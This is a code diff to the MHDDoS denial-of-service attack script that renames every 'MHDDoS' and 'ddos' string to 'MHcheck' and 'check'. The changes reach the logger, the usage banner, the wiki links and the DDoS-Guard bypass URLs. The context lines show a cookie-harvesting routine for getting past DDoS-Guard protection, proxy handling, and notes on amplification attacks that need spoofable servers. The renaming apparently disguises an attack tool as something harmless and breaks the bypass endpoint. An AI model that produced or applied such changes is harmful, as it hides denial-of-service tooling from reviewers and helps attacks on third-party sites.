@@ -40,7 +40,7 @@ from base64 import b64encode
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
-logger = getLogger("MHDDoS")
+logger = getLogger("MHcheck")
 logger.setLevel("INFO")
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
@@ -319,7 +319,7 @@ class Tools:
                 "Sec-Fetch-Mode": "no-cors",
                 "Sec-Fetch-Site": "cross-site"
             }
-            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
+            with s.post("https://check.check-guard.net/check.js", headers=hdrs) as ss:
                 for key, value in ss.cookies.items():
                     if key == '__ddg2':
                         idss = value
@@ -336,7 +336,7 @@ class Tools:
                 "Sec-Fetch-Mode": "no-cors",
                 "Sec-Fetch-Site": "cross-site"
             }
-            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
+            with s.get(f"{url}.well-known/check-guard/id/{idss}", headers=hdrs) as ss:
                 for key, value in ss.cookies.items():
                     s.cookies.set_cookie(cookies.create_cookie(key, value))
                 return s
@@ -1574,7 +1574,7 @@ class ToolsConsole:
     @staticmethod
     def usage():
         print((
-                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
+                  '* MHcheck - check Attack Script With %d Methods\n'
                   'Note: If the Proxy list is empty, The attack will run without proxies\n'
                   '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                   '      Proxy Type 0 = All in config.json\n'
@@ -1730,7 +1730,7 @@ if __name__ == '__main__':
                             or bombardier_path.with_suffix('.exe').exists()
                     ), (
                         "Install bombardier: "
-                        "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
+                        "https://github.com/MHProDev/MHcheck/wiki/BOMB-method"
                     )
 
                 if len(argv) == 9:
@@ -1780,7 +1780,7 @@ if __name__ == '__main__':
 
                 if method in Methods.LAYER4_AMP:
                     logger.warning("this method need spoofable servers please check")
-                    logger.warning("https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack")
+                    logger.warning("https://github.com/MHProDev/MHcheck/wiki/Amplification-check-attack")
 
                 threads = int(argv[3])
                 timer = int(argv[4])
